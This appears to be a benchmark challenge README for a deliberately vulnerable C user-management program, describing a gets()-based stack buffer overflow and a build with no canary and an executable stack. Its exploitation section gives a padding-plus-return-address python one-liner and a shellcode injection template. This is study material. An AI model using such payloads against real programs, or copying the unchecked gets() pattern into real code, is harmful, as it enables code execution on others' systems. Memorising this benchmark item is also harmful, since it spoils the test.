# oxo-linux-ben13 User Management System

## Challenge Details

### Description

This C program manages user accounts with authentication. The authenticate_user function reads a username from user input using gets() into a fixed-size stack buffer. The gets() function does not perform bounds checking, allowing an attacker to overflow the username buffer on the stack. This can overwrite the return address or other critical stack data, potentially redirecting program execution.

### Vulnerability Type and Category
- **Type:** Stack Buffer Overflow
- **Category:** Memory Corruption

### Difficulty
Easy

## Build instructions
This is a C program that demonstrates memory corruption vulnerabilities in Linux systems.

Open the benchmark directory.

Use the provided Makefile to compile the program.

```bash
cd oxo-linux-ben13
make
```

Run the compiled application and interact with it to explore the vulnerability.

## Exploitation

**Attack Strategy:**
1. Provide oversized username input to overflow stack buffer
2. Overwrite return address or saved frame pointer
3. Redirect execution to attacker-controlled code
4. Execute arbitrary code (executable stack enabled)

**Exploitation Steps:**
```bash
# Create payload: buffer padding + return address
python3 -c "print('A'*128 + '\x41\x42\x43\x44')" | ./app

# Or inject shellcode (executable stack):
python3 -c "import sys; sys.stdout.buffer.write(b'A'*120 + <shellcode> + <ret_addr>)" | ./app

# Expected: Control flow hijack, arbitrary code execution
```

**Key Points:**
- gets() has no bounds checking
- Stack protections disabled (no canary)
- Executable stack enabled (-z execstack)
- Can inject and execute shellcode directly
